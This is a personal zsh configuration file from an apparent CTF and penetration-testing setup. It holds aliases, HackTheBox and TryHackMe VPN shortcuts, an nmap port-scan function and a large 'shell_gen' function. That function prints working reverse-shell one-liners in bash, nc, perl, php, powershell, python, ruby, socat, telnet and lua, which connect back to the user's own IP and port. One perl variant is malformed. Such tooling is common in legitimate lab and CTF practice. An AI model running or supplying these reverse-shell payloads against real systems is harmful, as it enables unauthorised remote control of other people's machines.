if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi

# Path to the oh-my-zsh installation. Use your own user.
export ZSH="/home/daniel/.oh-my-zsh"

# Oh my zsh theme, plugins and load
ZSH_THEME="powerlevel10k/powerlevel10k"
plugins=(git zsh-autosuggestions)
source $ZSH/oh-my-zsh.sh

[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh

# Manual configurations
PATH=/usr:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/sbin:/usr/sbin:/home/daniel/.local/bin:/snap/bin:/usr/local/go/bin:/home/daniel/go/bin:/home/daniel/Tools
HISTSIZE=10000
SAVEHIST=10000
HISTFILE=~/.zsh_history

# Cat & ls aliases
alias ll='lsd -lh --group-dirs=first'
alias la='lsd -a --group-dirs=first'
alias l='lsd --group-dirs=first'
alias lla='lsd -lha --group-dirs=first'
alias ls='lsd --group-dirs=first'
alias cat='/usr/bin/bat'
alias catn='/usr/bin/cat'
alias catnl='/usr/bin/bat --paging=never'

# Utils
alias www='python3 -m http.server'
alias hosts='sudo nano /etc/hosts'
alias ffufdefault='ffuf -w /home/daniel/Diccionarios/directory_wordlist.txt -u '

# CTF platforms VPNs
alias htb='sudo openvpn ~/HackTheBox/D1r0x.ovpn'
alias thm='sudo openvpn ~/TryHackMe/Dirox.ovpn'

# Port scan with furious and nmap
scan(){
  puertos=$(/home/daniel/go/bin/furious -s connect -p 1-65535 $1 | grep "/tcp" | cut -d "/" -f1 | tr -d "\t" | sed -e 'H;${x;s/\n/,/g;s/^,//;p;};d')
  nmap -sC -A -sV -Pn -T4 -n -p$puertos $1 | tail -n+5 | head -n-3
}

# Show tun0 interface ip
vpn_ip(){
  interface='tun0'
  if [[ -d /sys/class/net/tun0 ]]; then
    echo $(ifconfig $interface | grep inet | head -1 | awk '{print $2}')
  else
    echo 'Unknown interface'
  fi
}

# Reverse shell commands generator
shell_gen(){
  RED='\033[0;31m'
  GREEN='\033[0;32m'
  ORANGE='\033[0;33m'
  BLUE='\033[0;34m'
  NC='\033[0m' # No Color

  if [ "$#" -ne 3 ]; then
      echo -e "${RED}[!]${NC} Syntax error. Correct syntax example: '${ORANGE}shell_gen INTERFACE PORT type${NC}'"
      echo -e "${GREEN}[?]${NC} Possible reverse shell options: ${ORANGE}bash, nc, lua, perl, php, powershell, python, ruby, socat, telnet${NC}"
  else
    if [[ -d /sys/class/net/$1 ]]; then
      ip=$(ifconfig $1 | grep inet | head -1 | awk '{print $2}')
      
      case $3 in
        bash)
          echo -e "${GREEN}[+]${NC} Choose your command: "
          echo -e "${BLUE}[1]${NC} sh -i >& /dev/tcp/$ip/$2 0>&1"
          echo -e "${BLUE}[2]${NC} 0<&196;exec 196<>/dev/tcp/$ip/$2; sh <&196 >&196 2>&196"
        ;;
        nc)
          echo -e "${GREEN}[+]${NC} Choose your command: "
          echo -e "${BLUE}[1]${NC} nc -e /bin/sh $ip $2"
          echo -e "${BLUE}[2]${NC} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $2 >/tmp/f"
        ;;
        lua)
          echo -e "${GREEN}[+]${NC} Your command: "
          echo -e "${BLUE}[1]${NC} lua5.1 -e 'local host, port = \"$ip\", $2 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
        ;;
        perl)
          echo -e "${GREEN}[+]${NC} Choose your command: "
          echo -e "${BLUE}[1]${NC} perl -e 'use Socket;\$i=\"$ip\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
          echo -e "${BLUE}[2]${NC} perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$2:{port}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
        ;;
        php)
          echo -e "${GREEN}[+]${NC} Choose your command: "
          echo -e "${BLUE}[1]${NC} php -r '\$sock=fsockopen(\"$ip\",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
          echo -e "${BLUE}[2]${NC} php -r '\$sock=fsockopen(\"$ip\",$2);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
          echo -e "${BLUE}[3]${NC} php -r '\$sock=fsockopen(\"$ip\",$2);system(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ;;
        powershell)
          echo -e "${GREEN}[+]${NC} Choose your command: "
          echo -e "${BLUE}[1]${NC} powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$2);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
          echo -e "${BLUE}[2]${NC} powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$2);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
        ;;
        python)
          echo -e "${GREEN}[+]${NC} Choose your command: "
          echo -e "${BLUE}[1]${NC} export RHOST=\"$ip\";export RPORT=$2;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
          echo -e "${BLUE}[2]${NC} python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
        ;;
        ruby)
          echo -e "${GREEN}[+]${NC} Choose your command: "
          echo -e "${BLUE}[1]${NC} ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$2).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
          echo -e "${BLUE}[2]${NC} ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",\"$2\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        ;;
        socat)
          echo -e "${GREEN}[+]${NC} Choose your command: "
          echo -e "${BLUE}[1]${NC} socat TCP:$ip:$2 EXEC:sh"
          echo -e "${BLUE}[2]${NC} socat TCP:$ip:$2 EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
        ;;
        telnet)
          echo -e "${GREEN}[+]${NC} Your command: "
          echo -e "${BLUE}[1]${NC} mknod a p && telnet $ip $2 0<a | /bin/sh 1>a"
        ;;
        *)
          echo -e "${RED}[!]${NC} Bad reverse shell type"
          echo -e "${GREEN}[?]${NC} Possible reverse shell options: ${ORANGE}bash, nc, lua, perl, php, powershell, python, ruby, socat, telnet${NC}"
        ;;
      esac 
    else
      echo -e "${RED}[!]${NC} Unknown interface"
    fi
  fi
}

# Set 'man' colors
function man() {
    env \
    LESS_TERMCAP_mb=$'\e[01;31m' \
    LESS_TERMCAP_md=$'\e[01;31m' \
    LESS_TERMCAP_me=$'\e[0m' \
    LESS_TERMCAP_se=$'\e[0m' \
    LESS_TERMCAP_so=$'\e[01;44;33m' \
    LESS_TERMCAP_ue=$'\e[0m' \
    LESS_TERMCAP_us=$'\e[01;32m' \
    man "$@"
}

# Manual plugins
source /usr/share/zsh/plugins/zsh-sudo/sudo.plugin.zsh
source /home/daniel/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh

# Completion system
autoload -Uz compinit
compinit

zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete _correct _approximate
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' menu select=2
eval "$(dircolors -b)"
zstyle ':completion:*:default' list-colors ${(s.:.)LS_COLORS}
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list '' 'm:{a-z}={A-Z}' 'm:{a-zA-Z}={A-Za-z}' 'r:|[._-]=* r:|=* l:|=*'
zstyle ':completion:*' menu select=long
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true

zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# Keybindings
bindkey "^[[1;5C" forward-word
bindkey "^[[1;5D" backward-word

# Delete initial warning
typeset -g POWERLEVEL9K_INSTANT_PROMPT=off
